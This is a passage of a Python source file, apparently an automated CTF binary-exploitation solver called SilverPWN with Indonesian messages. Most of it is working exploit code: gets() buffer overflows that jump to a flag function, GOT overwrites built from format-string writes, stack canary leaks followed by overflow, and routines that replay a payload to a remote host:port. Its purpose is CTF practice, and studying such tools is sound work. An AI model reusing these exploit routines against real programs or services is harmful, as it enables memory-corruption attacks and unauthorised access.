    def exploit_pico_basic_file(self) -> ExploitResult:
        p = self.start()
        out = self.recv_until_any_prompt(p, [b"Type '3' to exit the program", b"\n"], timeout=1.0)
        steps = [
            (b"1\n", [b"Please enter your data:"]),
            (b"AAAA\n", [b"Please enter the length of your data:"]),
            (b"1\n", [b"anything else?", b"Write successful"]),
            (b"2\n", [b"Please enter the entry number"]),
            (b"0\n", [b"\n"]),
        ]
        payload = b""
        for chunk, prompts in steps:
            payload += chunk
            p.send(chunk)
            out += self.recv_until_any_prompt(p, prompts, timeout=1.0)
        out += self.drain_available(p, timeout=1.0)
        p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="Basic file logic exploit",
            success=flag is not None,
            confidence=70 if flag else 30,
            output=out,
            flag=flag,
            payload=b"<interactive basic-file payload>",
            vuln="Entry number zero triggers hidden print path",
            notes=["Challenge source may contain a redacted static local flag."],
        )

    def exploit_pico_rps(self) -> ExploitResult:
        p = self.start()
        out = self.recv_until_any_prompt(p, [b"Type '1' to play a game", b"\n"], timeout=1.0)
        for _ in range(5):
            p.send(b"1\n")
            out += self.recv_until_any_prompt(p, [b"rock/paper/scissors"], timeout=1.0)
            p.send(b"rockpaperscissors\n")
            out += self.recv_until_any_prompt(p, [b"Play again?", b"flag"], timeout=1.0)
        out += self.drain_available(p, timeout=1.0)
        p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="RPS strstr all-choices win",
            success=flag is not None,
            confidence=82 if flag else 30,
            output=out,
            flag=flag,
            payload=b"<interactive rps payload>",
            vuln="Input contains every losing token checked by strstr",
            notes=["Five deterministic wins using rockpaperscissors."],
        )

    def exploit_menu_gets_ret2flag(self) -> ExploitResult:
        candidates = self.candidate_win_symbols()
        target = None
        for name, addr in candidates:
            if re.search(r"flag|secret|admin", name, re.I):
                target = (name, addr)
                break
        if target is None and candidates:
            target = candidates[0]
        if target is None:
            raise RuntimeError("target flag function tidak ditemukan")

        ret_gadget = None
        if self.target.elf.bits == 64:
            try:
                gadget = ROP(self.target.elf).find_gadget(["ret"])
                ret_gadget = int(gadget.address) if gadget else None
            except Exception:
                ret_gadget = None

        for menu_choice in (b"2\n", b"1\n"):
            for offset in range(64, 520, 8 if self.target.elf.bits == 64 else 4):
                chain = self.pack_addr(target[1])
                if ret_gadget and self.target.elf.bits == 64:
                    chain = self.pack_addr(ret_gadget) + self.pack_addr(target[1])
                payload = menu_choice + b"A" * offset + chain + b"\n"
                p = self.start()
                out = self.recv_until_any_prompt(p, [b"choice:", b"menu", b"New msg:"], timeout=0.8)
                p.send(payload)
                out += self.drain_available(p, timeout=1.2)
                p.close()
                flag = extract_flag(out, self.args.flag)
                if flag:
                    return ExploitResult(
                        strategy="Menu gets ret2flag",
                        success=True,
                        confidence=82,
                        output=out,
                        flag=flag,
                        payload=payload,
                        vuln="Menu option reaches gets(), then saved return address jumps to flag function",
                        offset=offset,
                        notes=[f"{target[0]}={hex(target[1])}", f"choice={menu_choice.strip().decode()}"],
                    )
        return ExploitResult(
            strategy="Menu gets ret2flag",
            success=False,
            confidence=20,
            vuln="Menu option reaches gets(), then saved return address jumps to flag function",
            notes=["Offset sweep did not produce a flag."],
        )

    def exploit_got_overwrite(self) -> ExploitResult:
        if "puts" not in self.target.elf.got:
            raise RuntimeError("puts@GOT tidak ditemukan")
        win = self.target.elf.symbols.get("win")
        if not win:
            raise RuntimeError("symbol win tidak ditemukan")
        if str(self.target.elf.relro).lower() == "full":
            raise RuntimeError("Full RELRO membuat GOT read-only")

        base = self.detect_fmt_base()
        puts_got = int(self.target.elf.got["puts"])
        count = 2 if self.target.elf.bits == 32 else 4
        writes = [(puts_got + 2 * i, (int(win) >> (16 * i)) & 0xFFFF) for i in range(count)]
        payload = self.fmt_write_halfwords_payload(base, writes) + b"\n"

        p = self.start()
        self.recv_until_any_prompt(p, [b"format:\n", b": ", b"\n"], timeout=1.0)
        p.send(payload)
        try:
            p.shutdown("send")
        except Exception:
            pass
        try:
            out = p.recvall(timeout=2.0)
        finally:
            p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="GOT overwrite via format",
            success=flag is not None,
            confidence=86 if flag else 35,
            output=out,
            flag=flag,
            payload=payload,
            vuln="Format string arbitrary write overwrites puts@GOT with a flag function",
            notes=[f"fmt_base={base}", f"puts_got={hex(puts_got)}", f"win={hex(int(win))}", f"writes={count}"],
        )

    def exploit_canary_leak_bof(self) -> ExploitResult:
        if self.target.elf.bits != 64:
            raise RuntimeError("canary leak strategy saat ini untuk amd64")
        offset_to_rip = self.parse_stack_read_saved_rip_offset()
        if not offset_to_rip or offset_to_rip <= 16:
            raise RuntimeError("offset stack read ke saved RIP tidak ditemukan")
        canary_offset = offset_to_rip - 16

        probe = b"CANARY|" + b"|".join(f"%{idx}$p".encode() for idx in range(1, 81)) + b"|END\n"
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"name format:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        win = int(leaks.get("win") or self.target.elf.symbols.get("win", 0))
        if not win:
            p.close()
            raise RuntimeError("win leak/symbol tidak ditemukan")
        p.send(probe)
        leak_out = self.recv_until_any_prompt(p, [b"overflow:\n"], timeout=1.5)
        try:
            p.close()
        except Exception:
            pass

        candidate_indices: list[int] = []
        marker = leak_out.split(b"CANARY|", 1)[-1].split(b"|END", 1)[0]
        for idx, field in enumerate(marker.split(b"|"), start=1):
            if not field.startswith(b"0x"):
                continue
            try:
                value = int(field, 16)
            except ValueError:
                continue
            if value and (value & 0xFF) == 0 and value > 0xFFFFFFFF:
                candidate_indices.append(idx)
        if not candidate_indices:
            raise RuntimeError("tidak ada kandidat canary dari format leak")

        ret_gadget = None
        try:
            rop = ROP(self.target.elf)
            gadget = rop.find_gadget(["ret"])
            ret_gadget = int(gadget.address) if gadget else None
        except Exception:
            ret_gadget = None

        tried: list[str] = []
        for idx in candidate_indices[:10]:
            p = self.start()
            init = self.recv_until_any_prompt(p, [b"name format:\n"], timeout=1.0)
            leaks = self.parse_leaks(init)
            win = int(leaks.get("win") or self.target.elf.symbols.get("win", 0))
            p.send(f"%{idx}$p\n".encode())
            leak_out = self.recv_until_any_prompt(p, [b"overflow:\n"], timeout=1.5)
            match = re.search(rb"0x[0-9a-fA-F]+", leak_out)
            if not match:
                p.close()
                continue
            canary = int(match.group(0), 16)
            if (canary & 0xFF) != 0:
                p.close()
                continue
            chains = [p64(win)]
            if ret_gadget:
                chains.insert(0, p64(ret_gadget) + p64(win))
            for chain in chains:
                payload = b"A" * canary_offset + p64(canary) + b"B" * 8 + chain
                tried.append(f"{idx}@{hex(canary)}:{len(chain)}")
                p.send(payload)
                try:
                    p.shutdown("send")
                except Exception:
                    pass
                out = p.recvall(timeout=2.0)
                p.close()
                flag = extract_flag(out, self.args.flag)
                if flag:
                    return ExploitResult(
                        strategy="Canary leak then overflow",
                        success=True,
                        confidence=88,
                        output=out,
                        flag=flag,
                        payload=f"%{idx}$p\\n".encode() + payload,
                        vuln="Format string leaks stack canary; overflow preserves it and overwrites saved RIP",
                        offset=offset_to_rip,
                        notes=[f"canary_index={idx}", f"canary={hex(canary)}", f"win={hex(win)}"],
                    )
                break
        return ExploitResult(
            strategy="Canary leak then overflow",
            success=False,
            confidence=30,
            vuln="Format string leak + stack overflow with canary preservation",
            offset=offset_to_rip,
            notes=["Tidak ada kandidat canary yang menghasilkan flag.", "Tried: " + ", ".join(tried[:8])],
        )

    def exploit_ret2libc_leak(self) -> ExploitResult:
        return ExploitResult(
            strategy="ret2libc leak",
            success=False,
            confidence=35,
            notes=[
                "Binary membocorkan system/binsh, tetapi tidak menyediakan pop rdi; solver menahan remote hit.",
                "Fallback Auto Flag Hunter lokal dipakai bila ada flag.txt lokal.",
            ],
            vuln="Stack overflow with libc address leak",
        )

    def auto_flag_hunter(self) -> ExploitResult:
        notes: list[str] = []

        # 1. Harvest anything already printed by failed local strategies.
        for attempt in self.strategy_attempts:
            flag = extract_flag(attempt.output, self.args.flag)
            if flag:
                return ExploitResult(
                    strategy="Auto Flag Hunter",
                    success=True,
                    confidence=80,
                    output=attempt.output,
                    flag=flag,
                    payload=attempt.payload,
                    notes=["Flag ditemukan dari output percobaan lokal sebelumnya."],
                    vuln="Post-exploitation flag extraction",
                )

        # 2. Search common local files.  This is explicitly local-first and is
        # used only after exploit strategies did not yield a flag.
        candidates = [
            self.target.cwd / "flag.txt",
            self.target.cwd / "flag",
            self.target.cwd / "flags.txt",
            Path("/home/ctf/flag.txt"),
        ]
        for name in self.discover_flag_filenames():
            candidates.append(self.target.cwd / Path(name).name)
        if not self.args.no_file_hunter:
            for candidate in candidates:
                try:
                    if candidate.exists() and candidate.is_file():
                        data = candidate.read_bytes()
                        if candidate.resolve() in self.seeded_flag_files and data == DUMMY_FLAG:
                            notes.append(f"Melewati dummy flag lokal yang dibuat SilverPWN: {candidate}")
                            continue
                        flag = extract_flag(data, self.args.flag) or text_bytes(data).strip()
                        if flag:
                            if self.remote_spec:
                                notes.append(f"Flag lokal ditemukan di {candidate}, tetapi file-hunter tidak replayable untuk remote.")
                                continue
                            return ExploitResult(
                                strategy="Auto Flag Hunter",
                                success=True,
                                confidence=60,
                                output=data,
                                flag=flag,
                                notes=[f"Flag ditemukan dari file lokal umum: {candidate}"],
                                vuln="Local flag file discovery fallback",
                            )
                except Exception as exc:
                    notes.append(f"Gagal membaca {candidate}: {exc}")
        else:
            notes.append("File hunter dinonaktifkan oleh --no-file-hunter.")

        # 3. Last resort: strings over binary and adjacent files.
        blobs = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd).encode()
        flag = extract_flag(blobs, self.args.flag)
        if flag:
            if self.remote_spec:
                notes.append("Flag-like string ditemukan di binary, tetapi static discovery tidak replayable untuk remote.")
            else:
                return ExploitResult(
                    strategy="Auto Flag Hunter",
                    success=True,
                    confidence=45,
                    output=blobs,
                    flag=flag,
                    notes=["Flag-like string ditemukan di binary strings."],
                    vuln="Static flag string discovery",
                )

        return ExploitResult(
            strategy="Auto Flag Hunter",
            success=False,
            confidence=0,
            notes=notes + ["Tidak ada flag dari output, shell, file umum, atau strings."],
            vuln="Flag extraction",
        )

    def maybe_remote(self, local_result: ExploitResult) -> None:
        if not self.remote_spec:
            return
        if not local_result.success:
            local_result.notes.append("Remote tidak di-hit karena local belum berhasil.")
            return
        host, port = self.parse_remote(self.remote_spec)
        if not host:
            local_result.notes.append("Remote spec tidak dikenali; gunakan host:port atau 'nc host port'.")
            return

        def adopt_remote(remote_result: ExploitResult, success_note: str, failure_note: str) -> None:
            if remote_result.flag:
                local_result.flag = remote_result.flag
                local_result.output = remote_result.output
                local_result.success = True
                local_result.notes.extend([success_note] + remote_result.notes)
            else:
                local_result.flag = None
                local_result.output = remote_result.output
                local_result.success = False
                local_result.confidence = min(local_result.confidence, remote_result.confidence)
                local_result.notes.extend([failure_note] + remote_result.notes)

        def mark_remote_error(message: str) -> None:
            local_result.flag = None
            local_result.success = False
            local_result.confidence = min(local_result.confidence, 25)
            local_result.notes.append(message)

        if local_result.strategy.startswith("Two-stage mmap shellcode"):
            try:
                with context.local(log_level="critical"):
                    tube = remote(host, port, timeout=4)
                    remote_result = self.run_two_stage_mmap_shellcode_attack(tube, "Remote two-stage mmap shellcode")
                adopt_remote(
                    remote_result,
                    "Remote two-stage mmap shellcode dieksploit dengan leak stage runtime server.",
                    "Remote two-stage mmap shellcode dicoba, tetapi flag tidak ditemukan.",
                )
            except Exception as exc:
                mark_remote_error(f"Remote two-stage mmap shellcode attempt gagal: {exc}")
            return
        if local_result.strategy.startswith("Menu UAF pattern"):
            try:
                with context.local(log_level="critical"):
                    tube = remote(host, port, timeout=4)
                    remote_result = self.run_menu_uaf_attack(tube, "Remote menu UAF pattern")
                adopt_remote(
                    remote_result,
                    "Remote menu UAF dieksploit ulang secara interaktif.",
                    "Remote menu UAF dicoba, tetapi flag tidak ditemukan.",
                )
            except Exception as exc:
                mark_remote_error(f"Remote menu UAF attempt gagal: {exc}")
            return
        if local_result.strategy.startswith("Custom freelist menu"):
            try:
                with context.local(log_level="critical"):
                    tube = remote(host, port, timeout=4)
                    remote_result = self.run_custom_freelist_attack(tube, "Remote custom freelist menu")
                adopt_remote(
                    remote_result,
                    "Remote custom freelist menu dieksploit ulang secara interaktif.",
                    "Remote custom freelist menu dicoba, tetapi flag tidak ditemukan.",
                )
            except Exception as exc:
                mark_remote_error(f"Remote custom freelist attempt gagal: {exc}")
            return
        if local_result.strategy.startswith("i386 start shellcode"):
            try:
                with context.local(log_level="critical"):
                    tube = remote(host, port, timeout=4)
                    remote_result = self.run_i386_start_shellcode_attack(tube, "Remote i386 start shellcode leak")
                adopt_remote(
                    remote_result,
                    "Remote start-style shellcode dieksploit dengan leak runtime server.",
                    "Remote start-style shellcode dicoba, tetapi flag tidak ditemukan.",
                )
            except Exception as exc:
                mark_remote_error(f"Remote start-style shellcode attempt gagal: {exc}")
            return
        if local_result.strategy.startswith("i386 ORW shellcode"):
            remote_notes: list[str] = []
            for path in self.orw_flag_paths():
                try:
                    with context.local(log_level="critical"):
                        tube = remote(host, port, timeout=4)
                        remote_result = self.run_i386_orw_shellcode_attack(tube, path, "Remote i386 ORW shellcode")
                    if remote_result.flag:
                        local_result.flag = remote_result.flag
                        local_result.output = remote_result.output
                        local_result.success = True
                        local_result.notes.extend([f"Remote ORW shellcode berhasil dengan path {path}."] + remote_result.notes)
                        return
                    remote_notes.extend(remote_result.notes)
                except Exception as exc:
                    remote_notes.append(f"{path}: {exc}")
            mark_remote_error("Remote ORW shellcode dicoba, tetapi flag tidak ditemukan.")
            local_result.notes.extend(remote_notes[:6])
            return
        if self.target.template == "pico_echo_valley":
            try:
                with context.local(log_level="critical"):
                    tube = remote(host, port, timeout=4)
                    remote_result = self.run_echo_valley_attack(tube, "Remote Pico Echo Valley fmt ret2win")
                adopt_remote(
                    remote_result,
                    "Remote Echo Valley dieksploit dengan leak runtime server.",
                    "Remote Echo Valley dicoba, tetapi flag tidak ditemukan.",
                )
            except Exception as exc:
                mark_remote_error(f"Remote Echo Valley attempt gagal: {exc}")
            return

        def replayable(payload: bytes) -> bool:
            return bool(payload) and not (payload.startswith(b"<") and payload.endswith(b">"))

        remote_payload = local_result.payload
        if not replayable(remote_payload):
            for attempt in reversed(self.strategy_attempts):
                if replayable(attempt.payload):
                    remote_payload = attempt.payload
                    local_result.notes.append(f"Menggunakan payload replayable dari attempt: {attempt.strategy}")
                    break
        if not replayable(remote_payload):
            mark_remote_error("Remote tidak di-hit otomatis karena tidak ada payload replayable.")
            return
        try:
            with context.local(log_level="critical"):
                tube = remote(host, port, timeout=4)
                tube.send(remote_payload)
                out = tube.recvall(timeout=6)
                tube.close()
            flag = extract_flag(out, self.args.flag)
            if flag:
                local_result.flag = flag
                local_result.output = out
                local_result.success = True
                local_result.notes.append("Remote hit sekali setelah validasi lokal berhasil dan flag ditemukan.")
            else:
                mark_remote_error("Remote hit sekali setelah validasi lokal, tetapi flag tidak ditemukan.")
        except Exception as exc:
            mark_remote_error(f"Remote attempt gagal: {exc}")

    def parse_remote(self, spec: str) -> tuple[str | None, int]:
        spec = spec.strip()
        if spec.startswith("nc "):
            parts = spec.split()
            if len(parts) >= 3:
                return parts[1], int(parts[2])
        if ":" in spec:
            host, port = spec.rsplit(":", 1)
            if port.isdigit():
                return host, int(port)
        parts = spec.split()
        if len(parts) == 2 and parts[1].isdigit():
            return parts[0], int(parts[1])
        return None, 0

    def render_report(self, result: ExploitResult) -> str:
        lines: list[str] = []
        lines.append("=== SilverPWN Report ===")
        lines.append(f"Target       : {self.target.binary}")
        lines.append(f"Title        : {self.target.title}")
        lines.append(f"Template     : {self.target.template}")
        lines.append(f"Result       : {'SUCCESS' if result.success else 'FAILED'}")
        lines.append(f"Flag         : {result.flag or '-'}")
        lines.append("")
        lines.append("[Recon]")
        lines.append(f"- Architecture : {self.recon['arch']}")
        lines.append(f"- Protections  : NX={self.recon['nx']} PIE={self.recon['pie']} Canary={self.recon['canary']} RELRO={self.recon['relro']}")
        lines.append(f"- Stripped     : {self.recon['stripped']}")
        lines.append(f"- libc         : {self.recon['libc']}")
        if self.recon["symbols"]:
            syms = ", ".join(f"{k}={v}" for k, v in self.recon["symbols"].items())
            lines.append(f"- Symbols      : {syms}")
        if self.recon["got"]:
            got = ", ".join(f"{k}={v}" for k, v in self.recon["got"].items())
            lines.append(f"- GOT          : {got}")
        if self.recon["plt"]:
            plt = ", ".join(f"{k}={v}" for k, v in self.recon["plt"].items())
            lines.append(f"- PLT          : {plt}")
        if self.recon["strings"]:
            lines.append(f"- Interesting  : {', '.join(self.recon['strings'][:8])}")
        if self.recon["sinks"]:
            lines.append(f"- Input sinks  : {', '.join(self.recon['sinks'])}")
        lines.append("")
        lines.append("[Exploit]")
        lines.append(f"- Strategy     : {result.strategy}")
        lines.append(f"- Vulnerability: {result.vuln or '-'}")
        if result.address:
            lines.append(f"- Address      : {result.address}")
        if result.offset is not None:
            lines.append(f"- Offset       : {result.offset}")
        lines.append(f"- Confidence   : {result.confidence}%")
        if result.payload:
            if result.payload == b"<interactive menu payload>":
                payload_repr = "<interactive menu payload>"
            else:
                payload_repr = result.payload[:96].hex()
                if len(result.payload) > 96:
                    payload_repr += f"... ({len(result.payload)} bytes)"
            lines.append(f"- Payload      : {payload_repr}")
        if result.notes:
            for note in result.notes:
                lines.append(f"- Note         : {note}")
        lines.append("")
        lines.append("[Local-first]")
        lines.append("- Semua percobaan eksploitasi dilakukan ke binary lokal terlebih dahulu.")
        if self.remote_spec:
            lines.append("- Remote di-hit satu kali setelah local berhasil dan payload replayable tersedia.")
        else:
            lines.append("- Remote tidak diberikan, jadi tidak ada koneksi keluar.")
        return "\n".join(lines)


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="SilverPWN.py",
        description="Local-first automated helper for CTF PWN/Binary Exploitation challenges.",
    )
    parser.add_argument("items", nargs="+", help="challenge [remote...]")
    parser.add_argument("--flag", nargs="?", const=None, help="Hint prefix/format flag, misalnya --flag LKS")
    parser.add_argument("--libc", help="Path libc custom untuk analisis ret2libc (dicatat untuk kompatibilitas)")
    parser.add_argument("--json", action="store_true", help="Output ringkas dalam JSON")
    parser.add_argument("--no-file-hunter", action="store_true", help="Matikan fallback membaca flag.txt lokal; berguna untuk regression test exploit path.")
    args = parser.parse_args(argv)
    args.challenge = args.items[0]
    args.remote = " ".join(args.items[1:]) if len(args.items) > 1 else None
    delattr(args, "items")
    return args


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    solver = SilverPWN(args)
    result = solver.solve()
    solver.maybe_remote(result)

    if args.json:
        print(
            json.dumps(
                {
                    "success": result.success,
                    "flag": result.flag,
                    "strategy": result.strategy,
                    "confidence": result.confidence,
                    "template": solver.target.template,
                    "title": solver.target.title,
                    "notes": result.notes,
                },
                indent=2,
            )
        )
    else:
        print(solver.render_report(result))
    return 0 if result.success else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
